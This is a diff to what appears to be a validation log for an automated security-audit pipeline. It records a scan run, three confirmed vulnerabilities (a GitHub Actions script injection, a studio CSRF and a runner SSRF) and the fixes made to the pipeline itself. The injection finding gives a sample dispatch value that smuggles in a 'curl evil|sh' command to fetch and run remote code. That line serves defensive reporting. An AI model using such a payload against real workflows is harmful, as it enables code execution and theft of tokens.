@@ -1,5 +1,24 @@
 # Seki + deepsec — validation
 
+## 2026-06-26 — clean run + cross-check vs independent manual audit (run 019f00bf)
+- Status: **validated** — converged end-to-end to `done` (detect_tech → generic/lang/custom scanners → deepsec → scan_join → scan_health → cap_findings → triage → 3-voter revalidate → majority → report_card), opus-first default, ~1h08m wall.
+- Versions: bot sec-audit-source (post detect_tech-decouple `036522d4f`) · iterion `dev+8f867f8e7290` (static) · `iterion-sandbox-sec:edge` · remediate=false, severity_threshold=medium, deepsec on.
+- Method: CLI `iterion run` into the operator's workspace `.iterion` store (studio-visible on :4891). **Default backends** (= opus-first triage/voters, claw+gpt-5.5 detect_tech). Read-only — no commits/branch.
+- Result: `scan_health` **healthy** — 4/4 generic scanners (gitleaks/trivy/semgrep-auto) + deepsec + custom all present, **993 raw findings**, degraded=false (no façade). Pipeline produced **3 confirmed / 4 uncertain / 65 dismissed**.
+- Value (confirmed):
+  1. **GHA script-injection** `version.yml:92` — `run: pnpm release-it ${{ github.event.inputs.version }} --ci` interpolates a workflow_dispatch input into the shell; a dispatch value `minor; curl evil|sh #` runs arbitrary code in a job holding the App token + id-token:write. semgrep+deepsec+3 voters agreed. **NEW** (the parallel Go-focused manual audit missed it). **FIXED** `68c8dd5b2` (env-var intermediary; + the sibling `image.yml` `github.ref_name`/`github.ref` tag-name sinks).
+  2. **Studio CSRF** `pkg/server/server.go:1066` — `/api/projects/switch` accepts `text/plain` (no preflight/Origin), so a visited page can re-point the studio workspace. → board/triage.
+  3. **Runner SSRF TOCTOU** `pkg/runner/loop.go` — the standing board-tracked one (resolved IP discarded; git re-resolves → DNS-rebinding / 302-to-internal). **Re-confirmed independently by BOTH Seki and the manual audit.** Still defence-in-depth only; full fix = connect-time IP pinning / pod NetworkPolicy.
+- Cross-check vs independent manual audit (parallel general-purpose agent, Go-focused): **complementary, not redundant**. Manual confirmed the runner SSRF, verified `safeNext` redirect SAFE, flagged the cloud opt-out env (Low). Seki added CI / secrets / desktop / full-tree breadth (the version.yml injection, the .env backups, desktop `SetSecret`/daemon-spawn). Neither alone was complete — that's the payoff of running both.
+- Operational heads-up: gitleaks flagged **two CRITICAL local backup env files at repo root** — `.env.dogfood-bak`, `.env.zai-mode-bak` — real (non-`.example`) backups almost certainly carrying live provider keys. Not read (secrets policy). They're gitignored (not in history) but live on disk → recommend delete/rotate.
+- Engine/bot/claw hardening (dogfood findings, all FIXED + committed):
+  - **A (Seki bot):** `detect_tech` shared `ITERION_SEC_AUDIT_BACKEND`/`MODEL` with triage but with *different* defaults (claw/gpt-5.5 vs claude_code/opus). Setting the spine var to `claude_code` to get "opus-first" (already the default) dragged detect_tech onto claude_code+openai/gpt-5.5 → run died at the first node. Gave detect_tech its own `ITERION_SEC_AUDIT_DETECT_*` (`036522d4f`).
+  - **B (engine/claude_code):** an invalid/unauthorized `--model` does NOT fail the CLI (`IsError=false`); its model-error sentence became the node result, ran two doomed formatting passes, then failed as an opaque "missing required field" schema error. Added `isModelUnavailableResult` fail-fast guard + unit test (`d36d2054d`).
+- Misses / further work:
+  - **report_card reached for `AskUserQuestion`** (ask_user) in a headless CLI run; it errored fast (0ms) and the agent recovered, but a report/board-emit node shouldn't have ask_user headless — strip it from report_card's toolset or auto-answer.
+  - **Sandbox surfacing gap:** under sandbox + worktree:auto, board.create no-ops (C082) AND `findings.md` is written *inside the worktree*, which finalize removes on a read-only (no-commit) run → confirmed findings have **no durable on-disk home** except `.iterion/runs/<id>/artifacts/majority_verdict`. Reconciliation here was reconstructed from that artifact. Fix: write findings.md to the store dir (outside the worktree) or persist via the HTTP board path.
+- Lessons for next run: opus-first default is solid — **zero** triage/voter stalls this run (vs the recurring gpt-5.5-forfait stalls). To force opus-first, set NOTHING. detect_tech is now decoupled. Surface findings.md outside the worktree so a read-only run leaves a durable report.
+
 ## 2026-06-23 — full clean run on opus, end-to-end (run 019ef389)
 - Status: **validated** — first complete run to `done` (scan → cap → triage → 3 voters → majority → report_card), on first-class opus.
 - Versions: bot sec-audit-source (opus-default fix `40a61ce97`) · iterion fresh static (campaign HEAD, incl. docker E2BIG fix) · `iterion-sandbox-sec:edge` · `remediate=false`.
